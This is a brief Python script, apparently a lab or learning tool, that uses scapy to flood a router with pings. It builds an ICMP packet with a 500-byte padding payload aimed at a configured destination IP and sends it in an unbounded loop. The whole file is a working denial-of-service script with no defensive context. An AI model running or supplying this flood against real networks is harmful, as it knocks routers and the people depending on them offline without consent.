#!venv/bin/python

from scapy.all import *
from scapy.all import Ether, IP, ICMP
import settings
"""
Sending a lot of pings to flooding router.
"""


pck = IP(dst=settings.destination_ip)/ICMP()/Raw(b"X" * 500)
pck.show()
send(pck, iface=settings.source_interface, loop=1)